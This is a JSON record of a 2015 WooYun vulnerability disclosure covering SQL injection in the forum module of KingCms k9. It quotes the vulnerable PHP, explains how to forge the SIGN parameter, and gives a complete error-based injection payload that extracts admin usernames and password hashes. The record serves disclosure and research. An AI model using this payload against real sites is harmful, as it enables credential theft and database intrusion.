{"id": 36917, "wybug_id": "wooyun-2015-0100818", "wybug_title": "KingCms最新版（k9）注入2枚", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-12 11:36", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）注入2枚 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9(2014-12-13更新)，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 注入点：POST /apps/forum/index.php HTTP/1.1当POST的参数cmd分别为topic和board时，会有两个地方存在注入，这里以cmd为topic为例进行说明注入参数：where 问题文件在/apps/forum/index.php\nfunction _create(){\t$u=new user;$u->auth_role('forum_create');\t$db=new db;\t$where=kc_get('where',0,1);\t$pid=kc_get('pid',2,1);\t$rn=kc_get('rn',2,1);\t$limit=($rn*($pid-1)).','.$rn.';';\t$cmd=kc_get('cmd',array('board','topic'));\t$pcount=kc_get('pcount',2,1);\t$start=$rn*$pid>$pcount?$pcount:$rn*$pid;\t\t$file=new file;\tif($cmd=='topic'){\t\t$res=$db->getRows('%s_forum_topic','*',$where,'',$limit);\t\tforeach($res as $rs){\t\t\t//process file to rela path\t\t\t$rs['TEMPLATE']='forum/topic/'.$rs['template'];\t\t\t$file->create($rs['url'],$rs,'apps/forum/_topic.php');\t\t}\t}else{\t\t$res=$db->getRows('%s_forum_board','*',$where,'',$limit);\t\tforeach($res as $rs){\t\t\t$rs['TEMPLATE']='forum/board/'.$rs['template'];\t\t\t$file->create($rs['url'],$rs);\t\t}\t}\t\t$js=\"\\$.kc_progress('#progress_{$cmd}',{$start},{$pcount});\";\t$js.=$start==$pcount ? \"\\$('.Submit').removeAttr('disabled');\":\"\\$.kc_ajax({URL:'\".FULLURL.\"apps/forum/index.php',CMD:'create',cmd:'$cmd',where:'$where',pid:\".($pid+1).\",rn:{$rn},pcount:{$pcount}});\";\tkc_ajax(array('JS'=>$js));}$_POST['where']没有经过处理就进入了$db->getRows，去看看$db->getRowspublic function getRows($table,$insql='*',$where=null,$order=null,$limit=null,$group=null) {\t\t$table=str_replace('%s',DB_PRE,$table);\t\t$sql=\"SELECT $insql FROM $table \";\t\t$sql.= empty($where) ? '' : \" WHERE $where\";\t\t$sql.= empty($group) ? '' : \" GROUP BY $group\";\t\t$sql.= empty($order) ? '' : \" ORDER BY $order\";\t\t$sql.= empty($limit) ? '' : \" LIMIT $limit\";\t\treturn $this->get($sql);\t}\n在执行sql语句之前，也没有过滤，这里就造成了注入。Kingcms可以报错，因此Payload：\njsoncallback=1&_=11&URL=http%3A%2F%2Flocalhost%2Fapps%2Fcontent%2Fcategroy.php&CMD=create&TID=1&AJAX=1&USERID=10000&SIGN=89ee81f5f1f328f555ceb7e7655d9f2f&pid=2&rn=2&cmd=topic&pcount=1&where=0 UNION SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(username,0x23,userpass)FROM king_user LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a%23\nPOST中的一个参数POST[‘SIGN’]的计算如下\n<?php$str=\"10000\";//10000即POST参数中的USERID$str.=\"kingcms.com\";//网站域名$SIGN=md5($str);?>\n注入成功，见下图\n\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}